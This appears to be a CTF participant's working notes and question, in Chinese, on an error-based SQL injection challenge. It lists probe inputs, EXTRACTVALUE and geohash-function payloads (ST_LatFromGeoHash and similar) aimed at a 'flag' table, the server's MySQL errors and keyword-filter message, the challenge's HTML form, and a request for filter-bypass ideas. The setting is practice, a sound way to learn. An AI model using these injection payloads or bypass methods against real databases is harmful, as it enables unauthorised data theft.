id=1'
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''id=1'' LIMIT 0,1' at line 1该comment id未被占用
id=1"
该comment id未被占用
id=1 AND 1=1
该comment id未被占用
id=1 AND 1=2
该comment id未被占用

1')) AND EXTRACTVALUE(1, (SELECT flag FROM flag WHERE 1=1)) #
evil word in [extractvalue, updatexml, floor, exp], why not try geohash?

1')) AND ST_LatFromGeoHash(CONCAT(0x7e, (SELECT flag FROM flag LIMIT 1))) #
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AND ST_LatFromGeoHash(CONCAT(0x7e, (SELECT flag FROM flag LIMIT 1))) #' LIMIT' at line 1该comment id未被占用

1')) AND ST_LongFromGeoHash(CONCAT(0x7e, (SELECT flag FROM flag LIMIT 1))) #
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AND ST_LongFromGeoHash(CONCAT(0x7e, (SELECT flag FROM flag LIMIT 1))) #' LIMI' at line 1该comment id未被占用

1')) OR (SELECT 1 FROM (SELECT ST_LatFromGeoHash(CONCAT(0x7e,(SELECT flag FROM flag LIMIT 1))))x)
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) OR (SELECT 1 FROM (SELECT ST_LatFromGeoHash(CONCAT(0x7e,(SELECT flag FROM fla' at line 1该comment id未被占用

1 and ST_PointFromGeoHash(version(), 1)
该comment id未被占用

我现在在做一道sql注入的CTF题，网站源代码如下所示：有人留下comments，请告诉我comment id。<br><br> 
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8" />
		<title>每次提交都需要验证码</title>
	</head>
	<body>
		<form method="" ="post" action="./index.php">
			<p>验证码图片：
				<img id="captcha_img" border="1" src="./captcha.php?r=581963872" alt="" width="100" height="30">
				
				<a href="javascript:void(0)" onclick="document.getElementById('captcha_img').src='./captcha.php?r='+Math.random() ">换一个?</a>
			</p>
 
			<p>请输入图片中的内容：
				<input type="text" name="authcode" value="" />
			</p>

			<p>请输入你想看的comment id：
				<input type="text" name="id" value=1 />
			</p>
 
			<p>
				<input type="submit" value="提交" style="padding: 6px 20px;">
			</p>
 
		</form>
	</body>
 
</html>

我尝试进行注入攻击：1')) AND EXTRACTVALUE(1, (SELECT flag FROM flag WHERE 1=1)) #
结果返回：evil word in [extractvalue, updatexml, floor, exp], why not try geohash?
请给出绕过检测的攻击思路